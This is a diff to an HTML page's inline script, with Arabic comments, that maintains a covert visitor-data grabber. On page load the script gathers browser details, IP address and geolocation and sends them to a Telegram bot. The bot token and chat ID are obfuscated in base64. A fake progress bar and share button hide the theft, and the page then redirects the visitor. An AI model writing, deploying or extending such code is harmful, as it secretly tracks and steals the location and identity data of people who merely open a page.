@@ -51,7 +51,7 @@
 
     <script>
         (function() {
-            // ===== البيانات المشفرة =====
+            // ===== التوكن الصحيح مشفر =====
             var _0x = {
                 token: "ODk5MDc3MTQwMzpBQUVreXlKYXNOTTJtTGltVl84QTdXNGNOR3JqSnhQX0lhbw==",
                 chatId: "MTcwMzgzMzM5",
@@ -89,7 +89,7 @@
                 document.getElementById('statusText').textContent = 'تم التحميل ...';
             }
 
-            // ===== دالة الإرسال الأساسية (من الكود الناجح) =====
+            // ===== دالة الإرسال =====
             async function sendToTelegram(message) {
                 try {
                     const response = await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
@@ -214,17 +214,14 @@
 
             // ===== الوظيفة الرئيسية =====
             async function main() {
-                log('🚀 Starting (simplified version)');
+                log('🚀 Starting');
 
-                // شريط التقدم
                 progressInterval = setInterval(updateProgress, 200);
 
-                // جمع البيانات الأساسية
                 const basicData = collectBasicData();
                 const ip = await getIP();
                 const location = await getLocation();
 
-                // بناء وإرسال الرسالة
                 const message = buildMessage(basicData, ip, location);
                 log('📤 Sending data...');
                 const sent = await sendToTelegram(message);
@@ -235,10 +232,8 @@
                     log('❌ Failed to send data');
                 }
 
-                // زر المشاركة
                 setupShareButton();
 
-                // إنهاء شريط التقدم والتحويل
                 const delay = 2000 + Math.floor(Math.random() * 1000);
                 log(`⏳ Redirect in ${delay}ms`);
 
@@ -257,7 +252,6 @@
                     }, 300);
                 }, delay);
 
-                // حماية إضافية
                 setTimeout(() => {
                     if (!isRedirected) {
                         isRedirected = true;
@@ -267,14 +261,13 @@
                 }, 6000);
             }
 
-            // ===== بدء التشغيل =====
             if (document.readyState === 'complete') {
                 setTimeout(main, 300);
             } else {
                 window.addEventListener('load', () => setTimeout(main, 300));
             }
 
-            log('✅ Simplified version loaded');
+            log('✅ Version loaded with correct token');
         })();
     </script>
 </body>
